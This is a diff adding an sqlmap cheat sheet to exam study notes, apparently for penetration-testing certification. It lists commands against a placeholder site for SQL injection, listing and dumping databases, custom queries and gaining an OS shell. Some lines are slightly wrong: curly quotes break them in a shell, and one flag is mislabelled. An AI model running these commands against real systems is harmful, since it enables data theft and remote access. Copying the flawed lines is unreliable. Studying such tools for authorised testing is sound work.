@@ -42,3 +42,34 @@ For this exam I'm writing
 
 ## SQLMAP
 
+- Simple usage `sqlmap -u “https://target_site.com/page/”`
+- Automatic GET request parameter `sqlmap -u “https://target_site.com/page?p1=value1&p2=value2”`
+- Use POST request `sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2"`
+- Request file as input(get it from Burpsuite) `sqlmap -r request.txt`
+- Use authenticated session with cookie `sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"`
+- Use authenticated session with auth headers `sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --headers="Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l"` 
+- Basic authentication `sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --auth-type=basic --auth-cred=username:password`
+
+# Post exploitation(use these if the SQLi vuln is positive)
+
+- List databases `sqlmap -u “https://target_site.com/page?p1=value1” --dbs`
+- List tables of TARGET_DB `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables`
+- List columns of TARGET_TABLE in TARGET_DB `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns`
+- Dump specific data of columns `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump`
+- Fully dump table `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump`
+- Dump the entire database `sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump`
+- Custom SQL query `sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"`
+- Get OS shell `sqlmap -u “https://target_site.com/page?p1=value1” --os-shell`
+- Get SQL shell `sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell`
+- Use attack techniques `sqlmap -u “https://target_site.com/page?p1=value1” --technique=BEUSTQ`
+    - B: Boolean-based blind
+    - E: Error-based
+    - U: Union query-based
+    - S: Stacked queries
+    - T: Time-based blind
+    - Q: Inline queries
+
+### General purpose command
+
+`sqlmap -u “https://target_site.com/page/”--proxy="http://127.0.0.1:8080/" --cookie=”SESSID=lred0jr6na1vmci;” --data=”p1=value1” -p p1 --level=5 --risk=3 --dbms=mysql --technique=BEUSTQ --force-ssl`
+
